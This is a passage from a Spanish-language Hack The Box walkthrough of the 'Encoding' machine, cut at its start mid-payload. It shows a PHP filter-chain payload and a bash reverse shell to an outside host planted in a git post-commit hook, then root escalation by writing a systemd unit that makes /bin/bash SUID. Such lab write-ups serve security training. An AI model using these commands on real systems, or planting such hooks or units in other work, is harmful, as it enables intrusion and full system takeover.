1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp
```

Lo introduzco en la petición y gano acceso al sistema como ```www-data```

```null
nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.4] from (UNKNOWN) [10.10.11.198] 33924
bash: cannot set terminal process group (827): Inappropriate ioctl for device
bash: no job control in this shell
www-data@encoding:~/image/actions$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
sh: 0: getcwd() failed: No such file or directory
shell-init: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory
www-data@encoding:$ ^Z
zsh: suspended  nc -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  nc -nlvp 443
                              reset xterm
www-data@encoding:$ export TERM=xterm
www-data@encoding:$ export SHELL=bash
www-data@encoding:$ stty rows 55 columns 209
```

Tengo un privilegio a nivel de sudoers

```null
www-data@encoding:$ sudo -l
Matching Defaults entries for www-data on encoding:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User www-data may run the following commands on encoding:
    (svc) NOPASSWD: /var/www/image/scripts/git-commit.sh
```

Corresponde al script en bash que había visto en el LFI, el que se encargaba de realizar el commit. El directorio ```.git``` tiene un permiso extra

```null
www-data@encoding:~/image$ ls -la
total 36
drwxr-xr-x  7 svc  svc  4096 Apr 15 18:36 .
drwxr-xr-x  5 root root 4096 Apr 15 18:36 ..
drwxrwxr-x+ 8 svc  svc  4096 Apr 15 18:36 .git
drwxr-xr-x  2 svc  svc  4096 Apr 15 18:36 actions
drwxr-xr-x  3 svc  svc  4096 Apr 15 18:36 assets
drwxr-xr-x  2 svc  svc  4096 Apr 15 18:36 includes
-rw-r--r--  1 svc  svc    81 Apr 15 18:36 index.php
drwxr-xr-x  2 svc  svc  4096 Apr 15 18:36 scripts
-rw-r--r--  1 svc  svc  1250 Apr 15 18:36 utils.php
```

Como ```www-data``` tengo capacidad de lectura, escritura y ejecución

```null
www-data@encoding:~/image$ getfacl .git/
# file: .git/
# owner: svc
# group: svc
user::rwx
user:www-data:rwx
group::r-x
mask::rwx
other::r-x
```

Abuso de un ```post-commit``` para ganar acceso

```null
www-data@encoding:~/image/.git/hooks$ echo "bash -c 'bash -i >& /dev/tcp/10.10.16.4/9001 0>&1'" > post-commit
www-data@encoding:~/image/.git/hooks$ chmod +x post-commit
www-data@encoding:~/image/.git/hooks$ cd ..
www-data@encoding:~/image/.git$ cd ..
www-data@encoding:~/image$ git --work-tree /etc/ add /etc/passwd
www-data@encoding:~/image$ sudo -u svc /var/www/image/scripts/git-commit.sh
```

```null
nc -nlvp 9001
listening on [any] 9001 ...
connect to [10.10.16.4] from (UNKNOWN) [10.10.11.198] 46408
svc@encoding:/var/www/image$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
shell-init: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory
shell-init: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory
sh: 0: getcwd() failed: No such file or directory
svc@encoding:/var/www/image$ ^Z
zsh: suspended  nc -nlvp 9001
❯ stty raw -echo; fg
[1]  + continued  nc -nlvp 9001
                               reset xterm

svc@encoding:/var/www/image$ export TERM=xterm
svc@encoding:/var/www/image$ export SHELL=bash
svc@encoding:/var/www/image$ stty rows 55 columns 209
```

Puedo ver la primera flag

```null
svc@encoding:~$ cat user.txt 
1e2df7c0a4d07a8237651f6a0571aaac
```

# Escalada

Tengo otro privilegio a nivel de sudoers

```null
svc@encoding:/home$ sudo -l
Matching Defaults entries for svc on encoding:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User svc may run the following commands on encoding:
    (root) NOPASSWD: /usr/bin/systemctl restart *
```

En este caso, la capacidad de poder reiniciar cualquier servicio del sistema. Miro los privilegios en ```/etc/systemd```. En ```system``` hay añadido uno extra

```null
vc@encoding:/etc/systemd$ ls -la
total 56
drwxr-xr-x    5 root root 4096 Apr 16 09:06 .
drwxr-xr-x  107 root root 4096 Jan 23 18:30 ..
-rw-r--r--    1 root root 1282 Apr  7  2022 journald.conf
-rw-r--r--    1 root root 1374 Apr  7  2022 logind.conf
drwxr-xr-x    2 root root 4096 Apr  7  2022 network
-rw-r--r--    1 root root  846 Mar 11  2022 networkd.conf
-rw-r--r--    1 root root  670 Mar 11  2022 pstore.conf
-rw-r--r--    1 root root 1406 Apr  7  2022 resolved.conf
-rw-r--r--    1 root root  931 Mar 11  2022 sleep.conf
drwxrwxr-x+  22 root root 4096 Apr 16 09:06 system
-rw-r--r--    1 root root 1993 Apr  7  2022 system.conf
-rw-r--r--    1 root root  748 Apr  7  2022 timesyncd.conf
drwxr-xr-x    4 root root 4096 Jan 13 12:47 user
-rw-r--r--    1 root root 1394 Apr  7  2022 user.conf
```

Tengo capacidad de escritura y ejecución pero no de lectuara

```null
user::rwx
user:svc:-wx
group::rwx
mask::rwx
other::r-x
```

En [GTFObins](https://gtfobins.github.io/gtfobins/systemctl/) contemplan una forma de escalar privilegios con este binario

<img src="/writeups/assets/img/Encoding-htb/4.png" alt="">

Creo un servicio y lo reinicio

```null
svc@encoding:/etc/systemd$ cat system/pwned.service
[Service]
Type=oneshot
ExecStart=/bin/sh -c "chmod u+s /bin/bash"
[Install]
WantedBy=multi-user.target'
```

```null
svc@encoding:/etc/systemd$ sudo systemctl restart pwned
```

La bash pasa a ser SUID y puedo ver la segunda flag

```null
svc@encoding:/etc/systemd$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1396520 Jan  6  2022 /bin/bash
svc@encoding:/etc/systemd$ bash -p
bash-5.1# cat /root/root.txt
311a5e99b6ac8099491de7a9a950d2af
```